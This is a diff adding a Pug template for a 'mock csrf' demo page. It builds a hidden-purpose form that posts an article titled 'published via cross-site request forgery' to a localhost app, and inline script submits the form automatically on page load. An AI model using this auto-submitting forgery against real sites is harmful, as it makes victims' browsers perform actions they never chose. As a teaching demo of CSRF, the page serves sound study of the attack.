@@ -1,0 +1,9 @@
+extends layout
+
+block content
+  h1 mock csrf
+  form#mock-form(action="http://localhost:4001/post" method="POST")
+    input(type="text" name="title" required placeholder="请输入文章标题" value="这是一篇通过跨站请求伪造发布的文章")
+    button(type="submit") 提交
+  script.
+    document.getElementById("mock-form").submit();
